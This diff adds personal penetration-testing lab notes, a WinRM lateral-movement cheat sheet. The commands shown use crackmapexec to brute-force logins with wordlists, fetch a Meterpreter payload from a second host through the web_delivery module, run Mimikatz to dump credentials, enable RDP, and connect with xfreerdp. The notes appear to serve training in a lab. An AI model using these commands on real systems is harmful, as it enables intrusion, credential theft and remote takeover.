@@ -49,3 +49,28 @@ smbexec.py is the same with psexec.py But smbexec.py doesn't create a temporary 
 
 What is a key security risk associated with using SMBExec for lateral movement? > It can bypass traditional firewalls and network segmentation.
 _______________________________________________________________________________________________________________________________________________________________________
+winrm > crackmapexec and evil-winrm
+
+Changing crackmapexec to get meterpreter shell
+----------------------------------------------
+#crackmapexec winrm 10.4.26.2 -u /usr/share/metasploit-framework/data/wordlists/unix-user.txt -p /usr/share/metasploit-framework/data/wordlists/unix-password.txt
+#crackmapexec winrm 10.4.26.2 -u administrator -p sebastian -M web_delivery -o URL=http://10.10.22.3:80/IzqgysneHDYTv
+
+To see how many modules are worked in crackmapexec
+--------------------------------------------------
+#crackmapexec winrm -L 
+
+You can use Mimikatz module and rdp module
+-----------------------------------------------
+#crackmapexec winrm 10.4.26.2 -u administrator -p sebastian -M Mimikatz
+#crackmapexec winrm 10.4.26.2 -u administrator -p sebastian -M rdp -o Action=enable
+
+connect with xfreerdp
+--------------------
+#xfreerdp /u:administrator /p:sebastian /v:10.4.26.2
+_______________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+_______________________________________________________________________________________________________________________________________________________________________
